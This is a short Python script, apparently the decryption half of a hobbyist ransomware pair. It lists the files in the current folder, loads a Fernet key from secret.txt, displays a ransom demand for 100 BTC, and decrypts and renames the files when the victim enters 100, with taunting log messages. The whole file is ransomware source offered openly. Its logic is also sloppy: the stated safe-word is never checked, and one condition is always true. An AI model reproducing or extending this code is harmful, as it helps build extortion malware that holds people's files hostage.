#!/usr/bin/env python3


import os
import time
import sys
import logging
from cryptography.fernet import Fernet

sage = []

for file in os.listdir():
   if file == "enc.py" or file == "secret.txt" or file == "dec.py":
       	continue

   if  os.path.isfile(file):
   	sage.append(file)

with open("secret.txt", "rb") as srt:
     key = srt.read()

pwd = input("Send 100 BTC or input Safe-word to retrieve your files...")
pwd = int(pwd)

s_wrd = "Mad-dogs1000"
count = 3

print(" ")



logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
    ]
)

logger = logging.getLogger("my_logger")

def defunct(pwd):

    for file in sage:
        with open(file, "rb")as f:
            contents = f.read()

        contents_adv = Fernet(key).decrypt(contents)

        with open(file, "wb")as f:
            f.write(contents_adv)

        old_file = file[:-4]
        os.rename(file, old_file)

    print(" ")
    logger.critical("[[192.168.0.0.0]] CO-OPERATION SUCCESSFUL....DECRYPTING FILES....")
    time.sleep(1)
    print(" ")
    sys.exit("=============== [CRITICAL] [[192.168.0.0.0]] DECRYPTION DONE!. No hard feelings :)...we all win ================")




if pwd == 100:
    defunct(pwd)

elif pwd <= 100 or pwd >= 100:
    count -= 1
    pwd = int(input(f"{count} more attempts remaining....not important files?..."))

    if pwd == 100:
       defunct(pwd)

    else:
       print(" ")
       pwd = int(input("Last chance....be serious..."))

       if pwd == 100:
          defunct(pwd)
       else:
          sys.exit("==================!!!MAXIMUM ATTEMPTS REACHED!!!========================")






